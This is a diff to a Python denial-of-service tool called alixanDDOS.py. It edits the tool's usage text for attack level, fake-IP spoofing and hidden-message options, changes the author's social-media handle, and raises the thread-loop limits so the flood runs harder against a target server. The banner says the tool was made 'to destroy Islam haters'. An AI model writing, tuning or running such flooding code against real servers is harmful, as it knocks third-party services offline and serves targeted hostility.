@@ -256,10 +256,10 @@ def usage1():
         	-h : help
         	-i : server ip
         	-p : port server 
-        	-l : Livel Attack {number}
+        	-l : Livel Attack {number} 
         	-f : Fake ip
             -d : Hide message
-            	Best lvl =3
+            	Best lvl =3 
 	example :
 	    python alixanDDOS.py -i 12.345.678 -p 80 -l 3"""
     md = Markdown(MARKDOWN)
@@ -286,7 +286,7 @@ def usage3():
     MARKDOWN="""
     Programmer : Dr Alixan
     Made for : Palestine
-    Instagram : @alixan.046
+    Telegram : @alixan046
     Tool Information : I Was Specially Made To Destroy Islam  Haters
 """
     md = Markdown(MARKDOWN)
@@ -299,7 +299,7 @@ def usage3():
 def run():
     os.system("clear")
     console.print(f"""
-    Hoat : {str(target)}
+    Host : {str(target)}
     Port : {ports}
     Level : {levels}
     Fake ip : {fake_ip}
@@ -327,7 +327,7 @@ def run():
     		#tasking
             item = 0
             while True:
-                if (item>18000): # for no memory crash maybe maybe 
+                if (item>50000): # for no memory crash maybe maybe 
                     item=0
                     time.sleep(.1)
                 item = item + 1
@@ -363,14 +363,14 @@ def run2():
             t.start()
             
             t2 = threading.Thread(target=dos2)
-            t2.daemon = True  # if thread is exist, it dies
+            t2.daemon = True  # if thread is exis,t, it dies
             t2.start()
             
             start = time.time()
     		#tasking
             item = 0
             while True:
-                if (item>180000): # for no memory crash maybe
+                if (item>500000): # for no memory crash maybe
                     item=0
                     time.sleep(.1)
                 item = item + 1
